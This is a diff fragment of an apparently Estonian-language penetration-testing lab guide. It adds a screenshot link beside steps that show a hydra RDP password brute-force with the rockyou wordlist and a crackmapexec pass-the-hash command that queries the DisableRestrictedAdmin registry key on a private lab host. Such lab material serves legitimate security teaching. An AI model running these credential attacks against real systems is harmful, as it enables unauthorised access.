@@ -219,6 +219,7 @@ hydra -V -f -l Administrator -P /home/heiki/Documents/rockyou.txt rdp://192.168.
     ```bash
     crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin'
     ```
+![Registrivõtme lubamine ja kontroll](https://github.com/ocrHeiki/RAKO/blob/main/materjalid/praktilisedTUNNID/neuroNET/pildid/Screenshot_2026-01-23_13_30_30.png)
 
 4.  Ühendu domeenikontrolleriga RDP kaudu, kasutades `xfreerdp3` ja `pass-the-hash` meetodit:
     ```bash
